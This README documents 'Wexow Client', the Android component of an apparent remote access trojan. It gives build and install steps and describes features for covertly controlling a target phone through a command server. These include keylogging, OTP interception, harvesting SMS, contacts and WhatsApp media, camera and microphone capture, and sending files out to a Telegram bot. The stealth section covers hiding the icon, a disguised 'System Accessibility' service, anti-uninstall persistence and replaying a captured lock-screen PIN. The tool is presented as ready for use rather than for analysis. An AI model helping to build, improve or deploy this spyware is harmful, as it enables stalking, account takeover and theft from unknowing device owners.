# 📱 Wexow Client

**Android client with Accessibility, MediaProjection, and stealth capabilities.**

---

## 📋 Table of Contents

- [Overview](#-overview)
- [Features](#-features)
- [Prerequisites](#-prerequisites)
- [Building](#-building)
- [Permissions](#-permissions)
- [Key Components](#-key-components)
- [Troubleshooting](#-troubleshooting)
- [Compatibility](#-compatibility)

---

## 🎯 Overview

The **Wexow Client** is an Android application that:

- **Connects** to the C2 server via WebSocket
- **Executes** commands remotely (screenshots, taps, data extraction)
- **Persists** in the background with multiple survival mechanisms
- **Hides** itself from the user (stealth mode)

### Design Goals

| Goal | Implementation |
|------|----------------|
| **Reliability** | Auto-reconnect, heartbeat, watchdog |
| **Stealth** | Hidden icon, silent notification, no traces |
| **Functionality** | Full device access via Accessibility |
| **Compatibility** | Android 11+ (API 30+) |

---

## ✨ Features

### 🎮 Remote Control
- **Gesture dispatch** — tap, swipe, click
- **Click by text/id/coordinates** — via Accessibility
- **Navigation** — back, home, recents, notifications
- **App launching** — launch by package or icon
- **URL opener** — open any link

### 📸 Media Capture
- **Live Screenshot** — MediaProjection streaming
- **Screen Share** — real-time MJPEG stream
- **Camera** — front/back camera with quality control
- **Microphone** — audio streaming + WAV recording
- **Screen Recording** — MP4 output

### 📱 Data Extraction
- **SMS/Calls/Contacts** — full read access
- **WhatsApp Media** — Images, Video, Audio
- **Location** — GPS + reverse geocoding
- **Emails** — from accounts, contacts, SMS
- **Clipboard** — real-time monitor
- **OTP** — auto-intercept from SMS
- **Keylogger** — typed text, clicks, focus

### 🖥️ Screen Reader
- **Full UI tree** — see everything on screen
- **Bypass FLAG_SECURE** — read protected apps
- **Clickable elements** — tap remotely
- **Text extraction** — search & filter

### 🔐 Advanced
- **Silent Notification** — hidden foreground service
- **Persistence** — boot restart, alarm watchdog
- **Device Admin** — lock, wipe, anti-uninstall
- **Remote Unlock** — PIN/Pattern (no Device Admin)
- **Local DB** — SQLite for offline storage

---

## 🔐 Environment Variables

in `/app/src/main/java/com/wexow/rat/managers/FileManager.java` update these two variable to send downloaded file/directory to Telegram bot:

```java
// ⭐ Setup Telegram
private static final String BOT_TOKEN = "YOUR_BOT_TOKEN";
private static final String CHAT_ID = "YOUR_CHAT_ID";
```

---

## 📋 Prerequisites

Before building the Wexow Client, ensure your environment meets the following requirements.

### 🖥️ System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Linux / macOS / Windows (WSL2) | Ubuntu 22.04+ |
| **RAM** | 4 GB | 8 GB+ |
| **Disk** | 5 GB | 15 GB+ |
| **CPU** | Dual-core | Quad-core+ |

### 🔧 Required Tools

| Tool | Version | Purpose |
|------|---------|---------|
| **Java JDK** | **11** (Temurin) | Android Gradle Plugin 7.x |
| **Android SDK** | API 34 | Compile target |
| **Build Tools** | 34.0.0 | APK packaging |
| **Platform Tools** | Latest | ADB |
| **Command-line Tools** | Latest | `sdkmanager` |
| **Gradle** | 8.x | Bundled via `gradlew` |

> ⚠️ **Critical**: The client uses **Java 11**, **NOT** 17 or 21. Using the wrong version will cause Gradle to fail.

### 📱 Android Device (Target)

| Requirement | Details |
|-------------|---------|
| **Android** | 11+ (API 30+) |
| **Root** | Not required |
| **USB Debugging** | Enabled |
| **Free Space** | 100 MB+ |

**Enable USB Debugging**:

1. **Settings → About Phone**
2. Tap **Build Number** 7 times
3. **Settings → Developer Options** → Enable **USB Debugging**

**Verify connection**:

```bash
adb devices
# List of devices attached
# <serial>    device
```

### 🚀 Quick Setup

From the project root:

```bash
# Install dependencies (one time)
./setup.sh

# Verify
./check-prereqs.sh

# Build the client
cd client
./build.sh
```

### ✅ Verification

```bash
java -version                    # 11.x.x
echo $ANDROID_HOME               # /path/to/Android/Sdk
adb --version                    # 1.0.41+
./gradlew --version              # Gradle 8.x
```

### 🐛 Common Issues

| Problem | Solution |
|---------|----------|
| **`Gradle requires Java 11`** | Set `JAVA_HOME` to Java 11 |
| **`SDK location not found`** | Create `local.properties` with `sdk.dir` |
| **`adb: command not found`** | Add `$ANDROID_HOME/platform-tools` to `PATH` |
| **`./gradlew: Permission denied`** | `chmod +x gradlew` |
| **`Could not find android-34`** | `sdkmanager "platforms;android-34"` |
| **`Out of memory`** | Add `org.gradle.jvmargs=-Xmx4096m` to `gradle.properties` |

---

## 🔨 Building

### Build

```bash
cd client
./build.sh

# Output
# - app/build/outputs/apk/debug/app-debug.apk
# - Copied to: ../server/base.apk
```

### Build Script

The `build.sh` script handles:

1. **Checks** Java 11 and Android SDK
2. **Creates** `local.properties` if missing
3. **Cleans** previous build (unless `--no-clean`)
4. **Builds** debug APK via Gradle
5. **Verifies** APK exists
6. **Copies** APK to `server/base.apk` (with `.bak` backup)

**Options**:

```bash
./build.sh              # Full build (clean + assemble + copy)
./build.sh --no-clean   # Fast rebuild (skip clean)
```

**Expected output**:

```
═══════════════════════════════════════════════════════
   Building Wexow Client APK
═══════════════════════════════════════════════════════

[*] [1/6] Checking prerequisites...
[✓] Prerequisites OK

[*] [2/6] Checking local.properties...
[✓] local.properties exists

[*] [3/6] Cleaning previous build...
[✓] Cleaned

[*] [4/6] Building debug APK...
BUILD SUCCESSFUL in 42s

[✓] Build completed in 42s

[*] [5/6] Verifying APK...
[✓] APK built: 8.2M (8593216 bytes)

[*] [6/6] Copying to server...
[✓] Copied to: /path/to/server/base.apk

═══════════════════════════════════════════════════════
   ✅ CLIENT BUILD COMPLETE
═══════════════════════════════════════════════════════
```

### Install on Device

##### Option 1:
download the apk from dashboard the install it on target device

##### Option 2 (with adb):
```bash
adb install -r ../server/output/Wexow.apk
```

### Activate

1. **Open the app** — Dashboard hidden behind launcher icon
2. **Grant permissions** — follow the wizard (7 batches)
3. **Enable Accessibility** — required for all features
4. **Enable Notification Listener** — for OTP/keylog
5. **Grant All Files Access** — for WhatsApp media

### Tested On

- Xiaomi MIUI 14 / HyperOS
- Samsung OneUI 6
- Stock Android 13/14
- Google Pixel 8

---

## 🔐 Permissions

### Runtime Permissions (Batched)

The app requests permissions in **7 batches** to avoid MIUI's limit:

| Batch | Permissions |
|-------|-------------|
| **1** | Camera, Microphone, Storage |
| **2** | Media (Images, Video, Audio), All Files |
| **3** | SMS, Phone, Phone Numbers |
| **4** | Call Logs, Call Phone |
| **5** | Contacts, Accounts |
| **6** | Location (Fine, Coarse, Background) |
| **7** | Notifications, Bluetooth, Sensors |

### Special Permissions

| Permission | How to Grant |
|------------|--------------|
| **Accessibility** | Settings → Accessibility → Wexow |
| **Notification Listener** | Settings → Notifications → Special access |
| **Display over apps** | Settings → Apps → Wexow → Display over other apps |
| **Battery Optimization** | Settings → Battery → Ignore |
| **All Files Access** | Settings → Apps → Wexow → Files and media |
| **Install Unknown Apps** | Settings → Apps → Wexow → Install unknown apps |

---

## 🏗️ Architecture

```
┌────────────────────────────────────────────────────────┐
│                   WexowApp (Application)                │
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │         MainService (Foreground Service)         │   │
│  │                                                   │   │
│  │  ┌─────────────────┐   ┌──────────────────────┐ │   │
│  │  │ ConnectionManager│   │   Heartbeat (20s)    │ │   │
│  │  │   (WebSocket)   │   │   Auto-reconnect     │ │   │
│  │  └────────┬────────┘   └──────────────────────┘ │   │
│  │           │                                       │   │
│  │           ▼                                       │   │
│  │  ┌────────────────────────────────────────────┐ │   │
│  │  │        Command Handler                      │ │   │
│  │  │        (switch on order)                    │ │   │
│  │  └────┬───────────────────────────────────────┘ │   │
│  │       │                                          │   │
│  │       ▼                                          │   │
│  │  ┌─────────────────────────────────────────┐   │   │
│  │  │         Feature Managers                 │   │   │
│  │  │                                          │   │   │
│  │  │  Camera  │  Mic  │  SMS  │  Calls       │   │   │
│  │  │  Files   │  Loc  │  Apps │  Screen      │   │   │
│  │  │  WhatsApp│  DB   │  Power│  ...         │   │   │
│  │  └─────────────────────────────────────────┘   │   │
│  └──────────────────────────────────────────────────┘   │
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │      KeylogManager (Accessibility Service)      │   │
│  │                                                   │   │
│  │  • onAccessibilityEvent                          │   │
│  │  • Screen Reader (dumpScreen)                    │   │
│  │  • Gesture dispatch (click, swipe)               │   │
│  │  • Keylogger (text, clicks, focus)               │   │
│  │  • Auto-click (uninstall, install, media)        │   │
│  └──────────────────────────────────────────────────┘   │
│                                                         │
│  ┌──────────────────────────────────────────────────┐   │
│  │  NotificationManager (NotificationListenerService)│   │
│  │                                                   │   │
│  │  • onNotificationPosted                          │   │
│  │  • WhatsApp message extraction                   │   │
│  │  • OTP interception                              │   │
│  │  • Silent notification cancellation              │   │
│  └──────────────────────────────────────────────────┘   │
└────────────────────────────────────────────────────────┘
```

---

## 🔧 Key Components

### `ConnectionManager.java`

**WebSocket client** with:

- Auto-reconnect (exponential backoff)
- Heartbeat (every 20s via MainService)
- Message queue for offline buffering

```java
ConnectionManager.send(json);

if (ConnectionManager.isConnected()) { ... }
```

### `MainService.java`

**Foreground service** that:

- Keeps app alive
- Runs heartbeat (ping every 20s)
- Manages `Camera`/`Mic` foreground types

```java
MainService.getInstance().upgradeForMediaProjection();
```

### `KeylogManager.java`

**Accessibility service** with:

- **Screen Reader** — `dumpScreen()`
- **Gestures** — `click(x,y)`, `swipe(...)`
- **Auto-click** — for install/uninstall dialogs
- **MediaProjection auto-approve** — clicks "Start now"
- **Lock/Unlock** — via coordinates

```java
KeylogManager.getInstance().startScreenReader();

KeylogManager.getInstance().click(x, y);
```

### `managers/*.java`

| Manager | Purpose |
|---------|---------|
| `CameraManager` | Camera streaming |
| `MicManager` | Microphone recording |
| `ScreenManager` | MediaProjection + VirtualDisplay |
| `FileManager` | File operations |
| `SMSManager` | Read SMS |
| `CallLogManager` | Read call logs |
| `ContactsManager` | Read/delete contacts |
| `LocManager` | GPS location |
| `AppLauncher` | Launch apps |
| `AppInstaller` | Install APK |
| `AppUninstaller` | Uninstall apps |
| `ClientDatabase` | Local SQLite |
| `ClipboardMonitor` | Clipboard |
| `OTPInterceptor` | OTP from SMS |
| `EmailExtractor` | Extract emails |
| `NotificationManager` | Notification listener |

---

## 🕵️ Stealth Mode

### Hide App Icon

```java
StealthManager.hideAppIcon(context);
```

Hides the app from:

- Launcher
- App drawer
- Recent apps

### Silent Notification

The foreground service notification:

- Uses `IMPORTANCE_NONE` (hidden)
- Empty title & text
- No badge, no sound
- User can't see it in status bar

### Rename Service

In `AndroidManifest.xml`:

```xml
<service
    android:name=".KeylogManager"
    android:label="System Accessibility"
    ... />
```

Appears in Accessibility settings as "System Accessibility" instead of "Wexow".

### Persistence

Multiple survival mechanisms:

1. **Boot Receiver** — restarts on boot
2. **AlarmManager** — restarts every 60s
3. **START_STICKY** — auto-restart on kill
4. **Device Admin** — anti-uninstall

---

## 🔓 Lock/Unlock (No Device Admin)

### Lock Screen

Uses `GLOBAL_ACTION_LOCK_SCREEN` (Android 9+):

```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
    performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
}
```

### Unlock with PIN

1. **Capture PIN** — via keylogger on lock screen
2. **Store PIN** — in memory
3. **Auto-enter** — click digits by coordinates

```java
KeylogManager.getInstance().unlockDevice("1234");
```

### Unlock with Pattern

Similar — dispatch a gesture on the pattern grid.

---

## 🐛 Troubleshooting

### "Accessibility Service malfunctioning"

**Cause**: `onAccessibilityEvent` too slow → Android kills service

**Fix**:

1. Check for heavy operations in `onAccessibilityEvent`
2. Avoid `getRootInActiveWindow()` repeatedly
3. Use `TYPE_WINDOW_STATE_CHANGED` only

### "App doesn't connect"

**Cause**: WebSocket blocked or firewall

**Fix**:

1. Check `adb logcat | grep ConnectionManager`
2. Verify server is running
3. Check Tailscale tunnel

### "Permissions not requested"

**Cause**: MIUI limits to ~5 permissions per request

**Fix**:

- The wizard uses 7 batches
- If still failing, grant manually via ADB

### "Icon reappears after hiding"

**Cause**: MIUI re-enables the launcher alias

**Fix**:

- Use `StealthManager.fullStealth()` (also hides from recents)
- Move the alias to a system-like name

### "Camera/Mic not working"

**Cause**: Android 14 requires FGS type declaration

**Fix**:

- Ensure `MainService` upgrades type before use
- Check `upgradeType()` call in `CameraManager`/`MicManager`

### "Build fails on Gradle"

**Cause**: Wrong Java version

**Fix**:

```bash
export JAVA_HOME=/usr/lib/jvm/temurin-11-jdk-amd64
./build.sh
```

---

## 📊 Compatibility

| Feature | API 30 | API 31 | API 32 | API 33 | API 34 |
|---------|:------:|:------:|:------:|:------:|:------:|
| Accessibility | ✅ | ✅ | ✅ | ✅ | ✅ |
| MediaProjection | ✅ | ✅ | ✅ | ✅ | ✅ |
| Live Screenshot | ✅ | ✅ | ✅ | ✅ | ✅ |
| Screen Reader | ✅ | ✅ | ✅ | ✅ | ✅ |
| Notification Listener | ✅ | ✅ | ✅ | ✅ | ✅ |
| Camera/Mic | ✅ | ✅ | ✅ | ✅ | ✅ |
| Location | ✅ | ✅ | ✅ | ✅ | ✅ |
| Contacts | ✅ | ✅ | ✅ | ✅ | ✅ |
| SMS/Calls | ✅ | ✅ | ✅ | ✅ | ✅ |
| Install APK | ⚠️ | ⚠️ | ⚠️ | ❌ | ❌ |
| Uninstall App | ⚠️ | ⚠️ | ⚠️ | ❌ | ❌ |
| WhatsApp Media | ✅ | ✅ | ✅ | ✅ | ✅ |

**Legend**: ✅ Works | ⚠️ Needs interaction | ❌ Blocked

---

## 📝 Code Style

- **Java 11** syntax
- **Android Studio** default formatting
- **No third-party libraries** beyond:
  - `androidx.appcompat`
  - `androidx.core`
  - `okhttp3`
  - `org.json`

### Avoid

- `Thread.sleep()` in main thread
- Long operations in `onAccessibilityEvent`
- `getRootInActiveWindow()` in loops
- Blocking the Accessibility thread

---

## 🤝 Contributing

See main [README](../README.md#-contributing).

### Development Setup

```bash
git clone https://github.com/Wnanovex/WexowRAT.git
cd WexowRAT/client

# Android Studio
studio .

# Or CLI
./gradlew assembleDebug
```

---

## 📜 License

Same as main project. See [LICENSE](../LICENSE).

---

<div align="center">

**[⬆ Back to Top](#-wexow-client)**

</div>